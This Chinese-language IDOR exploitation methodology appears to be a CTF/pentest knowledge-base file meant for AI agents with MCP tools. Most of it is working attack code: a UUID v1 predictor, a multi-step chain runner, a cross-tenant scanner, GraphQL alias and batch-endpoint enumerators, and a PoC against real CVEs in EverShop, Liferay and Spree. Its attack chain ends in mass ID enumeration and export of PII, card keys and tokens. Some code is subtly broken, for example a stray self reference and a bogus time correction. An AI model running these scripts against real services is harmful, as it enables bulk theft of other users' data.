# IDOR 深度枚举与利用 — 水平/垂直越权实战方法论

## 场景

IDOR (Insecure Direct Object Reference) 是 CTF 和实战中出现频率最高的漏洞类别之一，核心问题并非"使用了可预测的 ID"，而是"服务端未验证请求主体是否对目标对象有访问权限"。高水平选手关注的是：UUID 不等于安全、多步 IDOR 链、跨租户利用、以及 GraphQL/API Batching 等协议层面的越权放大。

## 输入信号

- URL 路径或查询参数中包含资源标识符（`/user/123`、`/order?id=X`、`/api/v1/invoices/{uuid}`）
- 请求体 JSON 中包含 user_id / order_id / account_id 等自控制字段
- GraphQL query 中 id 参数可被替换
- 响应中返回其他用户的数据（邮箱、订单、卡密、PII）
- UUID 格式一致但可枚举（v1 时间戳可预测，v4 无保护时纯靠暴力空间）
- 批量 API（`/api/users/batch`、`/api/v3/orders/list`）返回了超过当前认证范围的资源
- GraphQL 别名（alias）允许同一查询中多次引用不同 ID

## 核心方法论

### 1. ID 类型识别与预测

```
ID 类型                       预测性    枚举难度    典型场景
───────                      ──────    ──────    ──────────
自增整数 (1, 2, 3, …)        极高       低        简单 REST API
时间戳序列                    高         中        订单号/交易号
Hashids / 短码                中         中        公开短链接
UUID v1                      高         低        时间戳可逆向
UUID v4 (无保护)              无         中        空间 2^122, 但配合 API 可批量
JWT sub                      无         低        JWT 泄露后直接用
```

**UUID v1 逆向工具**：UUID v1 编码 100ns 精度的时间戳 + 机器标识。已知一个 UUID v1 即可推算生成时间窗口。

```python
# uuid_v1_decode.py — 逆向 UUID v1 预测后续 ID
import struct, time

def uuid1_to_timestamp(uuid_str: str) -> float:
    """将 UUID v1 字符串转换为 Unix 时间戳"""
    u = uuid_str.replace('-', '')
    time_low = int(u[0:8], 16)
    time_mid = int(u[8:12], 16)
    time_hi_and_version = int(u[12:16], 16) & 0x0fff
    uuid_time = (time_hi_and_version << 48) | (time_mid << 32) | time_low
    # UUID epoch: 1582-10-15 00:00:00
    unix_epoch_offset = 0x01b21dd213814000
    timestamp_100ns = uuid_time - unix_epoch_offset
    return (timestamp_100ns / 10000000) - 0x7d910  # leap seconds correction

def predict_uuid_v1_window(sample_uuid: str, count: int = 10) -> list:
    """基于采样 UUID 预测后续 N 个 UUID"""
    ts = uuid1_to_timestamp(sample_uuid)
    # 提取 clock_seq 和 node
    parts = sample_uuid.split('-')
    clock_seq = int(parts[3], 16) & 0x3fff
    node = parts[4]

    predicted = []
    for i in range(1, count + 1):
        next_ts = int((ts + i * 0.0001) * 10000000) + 0x01b21dd213814000
        # 重组 UUID (简化: 假设 clock_seq 不溢出)
        time_low = next_ts & 0xffffffff
        time_mid = (next_ts >> 32) & 0xffff
        time_hi = ((next_ts >> 48) & 0x0fff) | 0x1000  # version 1
        predicted.append(
            f"{time_low:08x}-{time_mid:04x}-{time_hi:04x}-"
            f"{clock_seq:04x}-{node}"
        )
    return predicted
```

### 2. 多步 IDOR 链

单步 IDOR 容易检测，真正致命的是多步链：

```
Step 1: GET /api/users/me               → 返回 {"id": 101, "email": "a@b.com"}
Step 2: GET /api/users/102              → 403 (直接越权被拦截)
Step 3: POST /api/messages              → 创建消息 {"to": 102, "body": "hello"}
Step 4: GET /api/messages/outbox        → 返回消息列表含 recipient email/avatar
Step 5: GET /api/messages/456/read-receipt → 返回 102 的完整用户信息
                                   ↑ 读权限 + 写权限链式利用
```

```python
# multi_step_idor.py — 自动化多步 IDOR 链
import requests, re, json

class MultiStepIDOR:
    """多步 IDOR 链自动利用"""
    def __init__(self, base_url, token):
        self.base = base_url.rstrip('/')
        self.s = requests.Session()
        self.s.headers.update({"Authorization": f"Bearer {token}"})
        self.state = {}

    def run(self, chain: list) -> dict:
        """按攻击链顺序执行"""
        results = {}
        for step in chain:
            method = step.get("method", "GET")
            path = self._interpolate(step["path"])
            data = self._interpolate(step.get("data", {}))
            params = self._interpolate(step.get("params", {}))

            if method == "GET":
                r = self.s.get(f"{self.base}{path}", params=params)
            elif method == "POST":
                r = self.s.post(f"{self.base}{path}", json=data)
            elif method == "PUT":
                r = self.s.put(f"{self.base}{path}", json=data)

            results[step["name"]] = {"status": r.status_code, "body": r.text[:500]}
            self._extract_state(r, step.get("extract", {}))
        return results

    def _interpolate(self, value):
        """用 state 替换模板变量 {key}"""
        if isinstance(value, str):
            for k, v in self.state.items():
                value = value.replace(f"{{{k}}}", str(v))
            return value
        if isinstance(value, dict):
            return {k: self._interpolate(v) for k, v in value.items()}
        return value

    def _extract_state(self, response, extract_map: dict):
        """从响应中提取字段到 state"""
        try:
            data = response.json()
            for state_key, json_path in extract_map.items():
                parts = json_path.split('.')
                val = data
                for p in parts:
                    if p.isdigit():
                        val = val[int(p)]
                    else:
                        val = val.get(p, {})
                if val and val != {}:
                    self.state[state_key] = val
        except:
            pass
```

### 3. 跨租户 IDOR (SaaS Multi-Tenant)

SaaS 架构中多租户 IDOR 是最严重的一类，因为一次越权即可访问整个租户的数据。

**真实 CVE 模式**：

- **Liferay CVE-2025-43810**: 跨组织站点查看，`groupId` 参数可替换为任意组织 ID，无需跨组织权限即可读取其他组织的站点配置和用户数据
- **Liferay CVE-2025-62241**: API 端点的 `accountId` 参数未校验调用者是否属于该 account，配合组织间共享 URL 可遍历所有账号数据

**跨租户 IDOR 检测模式**：

```python
# tenant_idor_scanner.py — 跨租户枚举
import itertools, requests, json

class TenantIDORScanner:
    def __init__(self, base_url, session: requests.Session):
        self.base = base_url
        self.s = session

    TENANT_ID_CANDIDATES = [
        # 常见参数名
        "/api/accounts/{id}/users",
        "/api/organizations/{id}/settings",
        "/api/workspaces/{id}/projects",
        "/api/teams/{id}/members",
        "/api/projects?org_id={id}",
        "/api/v2/entities/{id}/relationships",

        # GraphQL
        "/graphql",  # 通过 query 参数传 id
    ]

    def _discover_tenant_pattern(self, known_good_ids: list) -> list:
        """从已知合法租户 ID 推断 ID 空间"""
        patterns = []
        for tid in known_good_ids[:3]:
            if tid.isdigit():
                patterns.append("range")
            elif len(tid) == 36 and tid.count('-') == 4:
                patterns.append("uuid_v4")
            elif len(tid) == 8:  # short hash
                patterns.append("hashid")
        return patterns

    def cross_tenant_test(self, own_tenant_id: str, target_tenant_ids: list):
        """测试是否可以访问其他租户的资源"""
        results = {}
        for target_id in target_tenant_ids:
            if target_id == own_tenant_id:
                continue
            for path_tmpl in self.TENANT_ID_CANDIDATES:
                url = self.base + path_tmpl.format(id=target_id)
                for method in ["GET", "POST"]:
                    r = self.s.request(method, url, timeout=10)
                    if r.status_code == 200:
                        results[f"{method} {url}"] = {
                            "status": 200,
                            "body_preview": r.text[:300],
                            "tenant_id": target_id
                        }
        return results
```

### 4. GraphQL 别名批量越权 (Alias Batching)

GraphQL 允许在同一请求中通过不同别名多次调用同一个字段。如果后端在 resolver 层面做了鉴权但在 batch 层面没做限制，可以实现单次请求批量越权。

```graphql
# GraphQL Alias IDOR — 一次请求枚举多个用户
query batchIDOR {
  a1: user(id: 1001) { email role creditCardLast4 }
  a2: user(id: 1002) { email role creditCardLast4 }
  a3: user(id: 1003) { email role creditCardLast4 }
  a4: user(id: 1004) { email role creditCardLast4 }
  a5: user(id: 1005) { email role creditCardLast4 }
  a6: user(id: 1006) { email role creditCardLast4 }
  a7: user(id: 1007) { email role creditCardLast4 }
  a8: user(id: 1008) { email role creditCardLast4 }
}
```

```python
# graphql_alias_idor.py — 自动生成 GraphQL 别名越权查询
def generate_alias_query(field: str, id_field: str, ids: list, subfields: list) -> str:
    """生成 GraphQL alias batch IDOR 查询"""
    aliases = []
    for i, uid in enumerate(ids):
        fields_str = '\n      '.join(subfields)
        aliases.append(f'  a{i}: {field}({id_field}: {json.dumps(uid)}) {{\n      {fields_str}\n    }}')
    return 'query batchIDOR {\n' + '\n'.join(aliases) + '\n}'

# 真实案例: EverShop CVE-2025-12919
# GraphQL `order` query 无鉴权检查，UUID 订单号可枚举
EVER_SHOP_POC = generate_alias_query(
    field="order",
    id_field="id",
    ids=["ord-001", "ord-002", "ord-003", "ord-004"],
    subfields=["orderId", "customerName", "customerEmail", "shippingAddress { city street }", "paymentStatus", "grandTotal { value }"]
)
```

### 5. REST API 批量端点越权 (Batch IDOR)

现代 REST API 常提供批量操作端点以节省请求次数。这些端点往往鉴权不如单点查询严格：

```python
# batch_api_idor.py — 利用批量 API 端点枚举
BATCH_ENDPOINTS = [
    # JSON array batch
    ("POST", "/api/users/batch", lambda ids: ids),  # 直接传数组
    ("POST", "/api/v3/users", lambda ids: {"ids": ids, "fields": ["email", "role"]}),
    ("POST", "/api/orders/mget", lambda ids: ids),

    # Comma-separated
    ("GET", "/api/users", lambda ids: {"id__in": ",".join(map(str, ids))}),
    ("GET", "/api/v2/users/list", lambda ids: {"user_ids": ",".join(map(str, ids))}),

    # GraphQL batch
    ("POST", "/graphql", lambda ids: {"query": generate_alias_query("user", "id", ids, ["email", "role"])}),
]

def batch_idor_scan(base_url, session, target_ids: list):
    """测试批量端点越权"""
    results = {}
    for method, path, payload_builder in BATCH_ENDPOINTS:
        url = f"{base_url}{path}"
        payload = payload_builder(target_ids)
        r = session.request(method, url, json=payload if method == "POST" else None,
                            params=payload if method == "GET" else None)
        if r.status_code == 200:
            results[path] = f"200 OK — {len(r.text)} bytes — {r.text[:200]}"
        elif r.status_code in (403, 401):
            results[path] = f"{r.status_code} blocked"
        else:
            results[path] = f"{r.status_code}"

    # 检查响应是否包含其他用户的数据（越权成功信号）
    if r.status_code == 200:
        try:
            data = r.json()
            results["_analysis"] = {
                "data_count": len(data) if isinstance(data, list) else len(data.keys()),
                "contains_foreign_data": self._check_foreign(data)
            }
        except:
            pass
    return results
```

### 6. 真实 CVE 深度分析

| CVE | 产品 | 类型 | 原理 | 利用条件 |
|-----|------|------|------|----------|
| CVE-2025-12919 | EverShop 0.4.3 | GraphQL IDOR | `Query.order` resolver 未调用鉴权中间件，UUID 订单号可枚举，泄露姓名/邮箱/地址/支付状态/商品明细 | 获取任意一个订单 UUID |
| CVE-2025-43810 | Liferay DXP 7.4 | 跨租户 IDOR | `groupId` 参数越权，可跨组织查看站点配置和用户 | 已知任意有效 groupId |
| CVE-2025-62241 | Liferay Portal 7.4 | API 鉴权缺失 | `accountId` 未校验调用者归属，配合 REST API 遍历账号数据 | 有效的 API 会话 |
| CVE-2026-25757 | Spree Commerce 4.10 | 访客订单 IDOR | `authorize_access` 对 `user_id=nil` 的访客直接返回 true，不验证订单归属 | 任意订单号 |
| CVE-2024-33003 | SAP Commerce (CVSS 9.1) | 优惠券泄露 | 优惠券/卡密在 URL 参数中明文传递，可被 Referer/日志截获 | 用户点击链接 |

## 攻击链

```
Phase 1 — 信号采集
  ├── 注册/登录 → 收集自身资源 ID (user_id, order_id, invoice_id)
  ├── 分析 ID 格式特征 (长度、字符集、校验和)
  ├── 降低 ID 值测试 (user/1, user/0, user/-1)
  └── 检查 UUID 版本 (v1/v4 判定)

Phase 2 — 水平越权探测
  ├── 修改 ID 为其他用户的 ID
  │   ├── Cookie/Session 不变
  │   └── 观察 200 vs 403 vs 404 差异
  ├── GraphQL 别名批量拉取
  ├── 批量 API 端点探测
  └── 跨租户 ID 替换

Phase 3 — 多步链
  ├── 找到第一个 IDOR 点 (只读)
  ├── 提取受害者元信息 (email, role)
  ├── 利用元信息构造第二个请求 (修改/删除)
  └── 检查链式影响

Phase 4 — 放大
  ├── 爬虫级枚举 (1k-1M 级别的 ID 遍历)
  ├── 导出为 CSV/JSON
  └── 验证高价值数据 (卡密、Token、PII)
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测 IDOR 端点 | `http_probe` | 无 Cookie/Token 请求资源 API，观察响应差异 |
| 按信号查知识库 | `kb_router` | 搜索 IDOR/enumeration/multi-tenant 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 批量枚举测试 | `run_ctf_tool` | 运行自定义枚举脚本进行大规模 ID 遍历 |

## 参考资料

- [CVE-2025-12919] EverShop — GraphQL Order Query Without Authentication
- [CVE-2025-43810] Liferay — Cross-Organization Site Viewing via IDOR
- [CVE-2025-62241] Liferay — Missing Authorization in Account REST API
- [CVE-2026-25757] Spree Commerce — Unauthenticated Guest Order Access
- [CWE-639] Authorization Bypass Through User-Controlled Key
- PortSwigger Research: "GraphQL Alias Batching — A New Vector for IDOR Exploitation"

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
